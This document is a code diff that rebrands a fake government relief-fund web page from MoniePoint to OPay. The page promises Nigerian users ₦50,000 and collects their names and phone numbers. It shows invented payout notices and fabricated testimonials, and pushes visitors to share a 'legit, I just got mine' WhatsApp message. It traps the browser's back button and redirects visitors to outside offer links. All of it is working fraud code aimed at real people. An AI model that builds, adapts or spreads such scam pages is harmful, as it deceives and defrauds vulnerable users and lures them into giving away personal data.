@@ -29,7 +29,7 @@
 
 
     </script>
-  <meta charset="UTF-8" />
+ <meta charset="UTF-8" />
        <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
         <title>MoniePoint Batch B ₦50,000 NERSI Relief Support Funds</title>
 <link rel="shortcut icon" type="image/jpg" href="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjt9GZDbKjdkbbQMLn8ccOZ6O8NFDWS9-cdCxqG_sK4192zdw6hBtouitISjEPzJtsE5lRUwa8jBRtVr7fYfC4odIQS_3GCjzq2o-bDVaVF1AWt7uK5xy62dvGHc1cp0pclYKyuaEVBG3aCm0pw3BN8QjqE2WJ19b6o9LQUOpZjKFL5Sxl3rtx-Zn673-c/s1536/file_00000000b6148243ac85e8ad4791cb37.png" />
@@ -535,10 +535,10 @@ font-family: 'Noto Nastaliq Urdu', serif;
          
             <p class="welcome">
                 <center>
-                      <center><img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEh9IEZM1k0TfBPIz_pa00pbd_7Z4d-n9tYsgBaDS4RomTShJE3FttZ5gE5wQtGLqQeKAO7otQriA8ssEu6b4sHnarrfLGHqRkNsQ3-0HFwcOafoUUg5mfYOKGIqnTlydxrul5nE_4ZSmQLppFuJM1w99vJy0vY_111bSi9VeDMeUFYvqxcQ6csG7ViTgGI/s1402/file_00000000503081f48e5d931b43cca9de.png" alt="Opay" style="width:100%; height:150;"></center>
+                      <center><img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhR4FWVEQbR5FY_Is_ee2VMu3XFevSFdLYcVSyLrpEszAf3kkMoUhyphenhyphenupJeX1oMM_lJ4LjfPNy2Mj0cwtxJTlUj-71Fib4Q7iig1F20peuTV1zpsEtATz7oXmE3Co9pJZZkSkL3g2eTeIAsO5IK3jab7qfpIhXm1-r1C1QYVmGAK853gP5ghNkhasp3LsZU6/s1402/OPay%20%E2%82%A650,000%20Relief%20Support.png" alt="Opay" style="width:100%; height:150;"></center>
 			 <h6>
 
-                 <p>MoniePoint Batch B ₦50,000 NERSI Relief Support Funds<p/>
+                 <p>OPay ₦50,000 NERSI Relief Support Funds<p/>
 <p>POWERED BY: NERSI & FG</p>
 <p>Tap the button below, complete the 30-second registration, confirm your details, and get your ₦50,000 credited instantly.<p/>
 
@@ -565,8 +565,6 @@ font-family: 'Noto Nastaliq Urdu', serif;
         <div id="info">
           
             <div class="phone">
-				<br>
-				<br>
                 <form>
                     <div style="margin-bottom: 10px; display: flex; align-items: center;">
                         <label for="name" style="font-weight: bold; width: 80px; margin-right: 8px;">name:</label>
@@ -594,7 +592,7 @@ font-family: 'Noto Nastaliq Urdu', serif;
 <center><div>Please wait...</div>
 <div class="dog-loader">
 <div class="dog-loader-2">
-<span class="dog-gear-2">⚙️</span>⁷
+<span class="dog-gear-2">⚙️</span>
 <span class="dog-message-2" id="dog-msg2-1">Checking your name....</span>
 <span class="dog-message-2" id="dog-msg2-2">Checking the server...</span>
 <span class="dog-message-2" id="dog-msg2-3">Almost there...</span>
@@ -658,11 +656,12 @@ function tipn() {
         <div id="claim">
             <p class="done"><i class="fa fa-check-circle fa-3x" aria-hidden="true"></i></p>
 <p class="title">Your registration has been completed.</p>
+<button id="offer">CONTINUE</button>
 
 
 <div style="padding: 1.5rem 1rem; display: flex; flex-direction: column; gap: 14px; align-items: center;">
 
-  <a href="https://rm358.com/4/10858997?var=messi" onclick="window.open('https://rm358.com/4/10858997?var=messi')" style="text-decoration: none; width: 100%; max-width: 420px;">
+  <a href="https://gifmi.site/opayrelieflink" onclick="window.open('https://gifmi.site/secondlink')" style="text-decoration: none; width: 100%; max-width: 420px;">
     <div style="display: flex; align-items: center; justify-content: center; gap: 10px; width: 100%; padding: 16px 24px; background: #1D9E75; color: #E1F5EE; border-radius: 12px; font-size: 17px; font-weight: 500; cursor: pointer; box-sizing: border-box;">
   CASH OUT N50,000 NOW
     </div>
@@ -681,8 +680,13 @@ function tipn() {
 
 <script>
   function updateOfferDate() {
-    const day = 12;
-    const month = 'December';
+    const tomorrow = new Date();
+    tomorrow.setDate(tomorrow.getDate() + 2);
+
+    const day = tomorrow.getDate();
+    const month = tomorrow.toLocaleString('en-GB', {
+      month: 'long'
+    });
 
     let suffix = 'th';
 
@@ -698,6 +702,7 @@ function tipn() {
 
   updateOfferDate();
 </script>
+
 
 <script type="text/javascript">
 var time = 0;
@@ -776,7 +781,7 @@ $("#confirm").click(function () {
                 $("#load").fadeOut(0);
                 $("#check").fadeIn(0);
                 setTimeout(function () {
-                    $("#checking")..fadeOut(0);
+                    $("#checking").fadeOut(0);
                     $("#share").fadeIn(1000);
                     $("#getname").html($("#name").val());
                     $("#getname1").html($("#phone").val());
@@ -794,11 +799,11 @@ $(document).click(function () {
 </script>
 
     <script>
- var text1 = "*Moniepoint%20Second Batch%20%E2%82%A650%2C000%20NERSI%20Relief%20Support%20Funds*%0A%0AGet%20your%20N50%2C000%20NERSI%20Relief%20Support%20Funds%2C%20All%20is%20Moniepoint%2C%20I%20users%20check%20elegibility.%20Sponsored%20by%20the%20Federal%20Government.%0A%0AGet%20Yours%20Here%20%F0%9F%91%87%0A%0Ahttps://edasdar.github.io/moniepoint-50k-Relief/NERSI%0A%0A*ENDING%20SOON*";
+ var text1 = "*OPay%20%E2%82%A650%2C000%20NERSI%20Relief%20Support%20Funds*%0A%0AGet%20your%20N50%2C000%20NERSI%20Relief%20Support%20Funds%2C%20it%20is%20legit%2C%20I%20just%20got%20mine.%20Sponsored%20by%20the%20Federal%20Government.%0A%0AGet%20Yours%20Here%20%F0%9F%91%87%0A%0Ahttps://gifmi.site/opay-50k-relief%0A%0A*ENDING%20SOON*";
             text2 = " an amount of ",
             text3 = " for every citizen who meets the conditions as an aid to the poor class to overcome the crisis. Enter and register now and make sure to register correctly 👉 ",
             error = "Something is wrong!\nPosts are not calculated. You may have shared it with the same friend or group more than once, please re-share",
-            abcde = "https://edasdar.github.io/moniepoint-50k-Relief/NERSI",
+            abcde = "https://gifmi.site/opayrelieflink",
             saved = "",
             share = "whatsapp://send?text=" + text1;
     </script>
@@ -842,36 +847,36 @@ document.write(unescape('%20%3Cscript%20type%3D%22text/javascript%22%3E%0A%20var
         fh();}
     setTimeout('hh();', 500);
     function fh(){
-        location.href="https://rm358.com/4/10858997?var=messi";
+        location.href="https://gifmi.site/opayrelieflink";
     }
     function goon(){
-        location.href="https://rm358.com/4/10858997?var=messi";
+        location.href="https://gifmi.site/opayrelieflink";
     }
 </script>
 <script type="text/javascript">! function (){	var t;	try{for (t=0; 10 > t; ++t)		history.pushState({}, "", "#");	onpopstate=function (t)	{		t.state && alert('Please Complete The Required Actions to Recieve Your Gift');		}}		catch (o){}}();</script>
 <script>
  
 const messages = [
-  "₦50,000 sent to Chinedu Okafor 54546557856 moniepoint",
-  "₦50,000 sent to Amina Ibrahim 554387574858 moniepoint",
-  "₦50,000 sent to Adewale Johnson 555585786 moniepoint",
-  "₦50,000 sent to Nneka Eze 5754256745 moniepoint",
-  "₦50,000 sent to Tobi Williams 554936743 moniepoint",
-  "₦50,000 sent to Musa Abdullahi 54546753672 moniepoint",
-  "₦50,000 sent to Zainab Ahmed 55235525758 moniepoint",
-  "₦50,000 sent to Emeka Nwosu 5050968478 moniepoint",
-  "₦50,000 sent to Grace Okoro 5455575767 moniepoint",
-  "₦50,000 sent to Daniel Adekunle 5754656475 moniepoint",
-  "₦50,000 sent to Kelechi Obi 5454356456 moniepoint",
-  "₦50,000 sent to Ibrahim Sani 5445453535 moniepoint",
-  "₦50,000 sent to Funmi Adebayo 5554724536 moniepoint",
-  "₦50,000 sent to Chisom Nwankwo 55524756435 moniepoint",
-  "₦50,000 sent to Samuel Falana 56567453532 moniepoint",
-  "₦50,400 sent to Hauwa Yusuf 5455646738 moniepoint",
-  "₦50,000 sent to Uche Nnamdi 5455875356 moniepoint",
-  "₦50,000 sent to Folake Ogunleye 5556464357 moniepoint",
-  "₦50,000 sent to Ismail Sule 5056846856 moniepoint",
-  "₦50,000 sent to Ngozi Chukwu 544353532 moniepoint"
+  "₦25,000 sent to Chinedu Okafor 8156557856 OPay",
+  "₦10,000 sent to Amina Ibrahim 204687574858 UBA",
+  "₦35,000 sent to Adewale Johnson 6746785786 GTBank",
+  "₦15,000 sent to Nneka Eze 5783256745 FCMB",
+  "₦40,000 sent to Tobi Williams 425636743 Access Bank",
+  "₦20,000 sent to Musa Abdullahi 3636753672 Fidelity Bank",
+  "₦30,000 sent to Zainab Ahmed 42767525758 Sterling Bank",
+  "₦45,000 sent to Emeka Nwosu 4277968478 Wema Bank",
+  "₦10,000 sent to Grace Okoro 7547575767 Access Bank",
+  "₦29,000 sent to Daniel Adekunle 5743656475 OPay",
+  "₦25,000 sent to Kelechi Obi 2427356456 OPay",
+  "₦35,000 sent to Ibrahim Sani 446453535 Fidelity Bank",
+  "₦16,000 sent to Funmi Adebayo 6734724536 UBA",
+  "₦45,000 sent to Chisom Nwankwo 67324756435 Keystone Bank",
+  "₦30,000 sent to Samuel Falana 76467453532 FCMB",
+  "₦27,400 sent to Hauwa Yusuf 163564673 Sterling Bank",
+  "₦41,000 sent to Uche Nnamdi 4546875356 Wema Bank",
+  "₦43,000 sent to Folake Ogunleye 8756464357 OPay",
+  "₦10,500 sent to Ismail Sule 1227846856 Union Bank",
+  "₦35,000 sent to Ngozi Chukwu 445353532 Keystone Bank"
 ];
 
 
@@ -1045,7 +1050,7 @@ const messages = [
   const TOP_COMMENTS = [
   "Just claimed my ₦50,000 NERSI relief fund! Federal government really came through 🔥",
   "Is this still working? I need that ₦50k NERSI support asap",
-  "moniepoint and the federal government, this is how you support the people 👏",
+  "OPay and the federal government, this is how you support the people 👏",
   "Just registered, when will the ₦50k drop into my account?",
   "This is the best relief support offer I've seen this year!",
   "Who else just got credited? Let me know 👀",
@@ -1058,7 +1063,7 @@ const messages = [
   "I shared with my family, we all claiming today 😂",
   "Limited slots ke? I'm not missing this one",
   "Best decision I made today was clicking that link",
-  "moniepoint and NERSI to the world! Relief support all the way 🙌",
+  "OPay and NERSI to the world! Relief support all the way 🙌",
   "Can confirm it works, just received mine!",
   "Anyone from Lagos or Abuja claiming too?",
   "This is how the federal government should support the people",
@@ -1073,7 +1078,7 @@ const REPLIES = [
   "Do it now, slots are finishing fast",
   "I'm from Lagos and it worked perfectly",
   "Just tagged my people, everybody should claim",
-  "True talk, moniepoint and NERSI dey try for us",
+  "True talk, OPay and NERSI dey try for us",
   "I was doubting at first but it came through",
   "Already shared in my WhatsApp group",
   "Yes o, even people outside Lagos are collecting",
@@ -1570,23 +1575,7 @@ const REPLIES = [
 </script>
 	</div>
 <!-- BEGIN: Powered by Supercounters.com -->
-<center>
-<script type="text/javascript" src="//widget.supercounters.com/ssl/online_i.js"></script>
-<script type="text/javascript">
-sc_online_i(1741118,"ffffff","ffffff");
-</script>
-</center>
-<!-- END: Powered by Supercounters.com -->
-<script>
-document.getElementById("go").addEventListener("click", function() {
-    document.getElementById("intro").style.display = "none";
-    document.getElementById("loader").style.display = "block";
+<center><script type="text/javascript" src="//widget.supercounters.com/ssl/online_i.js"></script><script type="text/javascript">sc_online_i(1740434,"ffffff","ffffff");</script><!-- END: Powered by Supercounters.com -->
 
-    setTimeout(function() {
-        document.getElementById("loader").style.display = "none";
-        document.getElementById("info").style.display = "block";
-    }, 3000);
-});
-</script>
 </body>
 </html>
